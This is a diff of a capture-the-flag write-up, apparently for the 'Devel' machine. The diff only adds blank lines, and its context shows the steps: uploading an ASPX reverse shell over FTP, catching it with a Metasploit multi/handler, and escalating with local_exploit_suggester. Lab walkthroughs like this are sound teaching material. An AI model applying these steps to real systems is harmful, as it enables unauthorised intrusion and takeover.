@@ -33,6 +33,7 @@ There aren't that much to enumerate and I found out that the directory you are i
 # HTTP-Port 80
 It's just the default page of IIS7:
 ![](/img/devel-writeup/screenshot1.png)
+
 I tried doing directory bruteforcing using gobuster but it didn't give me much info that could help me root this machine.
 
 # Foothold
@@ -56,6 +57,7 @@ ftp> put shell.aspx
 ```
 Now time to execute our shell through a web browser as shown below in the image: 
 ![](/img/devel-writeup/screenshot2.png)
+
 And run our msf handler:
 ```
 msf5 use exploit/multi/handler
@@ -65,6 +67,7 @@ msf5 exploit(multi/handler) set lport 1337
 msf5 exploit(multi/handler) run
 ```
 Then I run "Multi recon exploit suggester" It's a kind of msfconsole module that tries to gather information about the machine and suggest you exploits.
+
 ![](/img/devel-writeup/screensho4.png)
 ```
 background 
@@ -73,12 +76,18 @@ msf5 post(multi/recon/local_exploit_suggester) > set session 2
 msf5 post(multi/recon/local_exploit_suggester) > run
 ```
 ![](/img/devel-writeup/screenshot3.png)
+
 Yikes! That's a lot of exploits to try so I tried the first exploit but it didn't work for me so I used the 2nd and it WORKED GREAT!
 ## BAM!
+
 ![](/img/devel-writeup/screenshot5.png)
+
 Now it's time to grab root!
+
 ![](/img/devel-writeup/screenshot7.png)
+
 Tadah!
+
 ![](/img/devel-writeup/joven.gif)
 
 
